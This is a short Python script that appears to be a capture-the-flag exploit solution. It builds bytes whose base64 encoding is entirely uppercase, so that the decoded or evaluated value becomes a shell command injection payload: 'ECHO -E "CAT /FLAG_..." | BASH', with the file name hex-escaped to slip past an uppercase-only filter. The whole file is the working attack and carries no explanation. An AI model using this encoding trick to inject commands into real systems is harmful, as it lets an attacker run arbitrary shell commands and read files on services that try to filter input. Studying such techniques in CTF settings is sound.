import base64

# Don't judge this code
def findMatching(input):
    final_to_encode = b""
    for c,i in enumerate(input):
        i = bytes([i])
        tmp = base64.b64encode(final_to_encode + i)
        if tmp.upper() == tmp:
            final_to_encode = final_to_encode + i
            continue
        tmp = base64.b64encode(final_to_encode + b"\x00" + i)
        if tmp.upper() == tmp:
            final_to_encode = final_to_encode + b"\x00" + i
            continue
        tmp = base64.b64encode(final_to_encode + b"\x00"*2 + i)
        if tmp.upper() == tmp:
            final_to_encode = final_to_encode + b"\x00"*2 + i
            continue
        print(f"no solution found :( Substring: {input[c:]}")
        exit(0)
    
    return final_to_encode

solution = findMatching(bytes(b"ECHO -E \"CAT /\\x46\\x4c\\x41\\x47_\\x33\\x32\\x37\\x61\\x36\\x63\\x34\\x33\\x30\\x34\\x61\\x64\\x35\\x39\\x33\\x38\\x65\\x61\\x66\\x30\\x65\\x66\\x62\\x36\\x63\\x63\\x33\\x65\\x35\\x33\\x64\\x63\" | BASH"))
print(base64.b64encode(solution))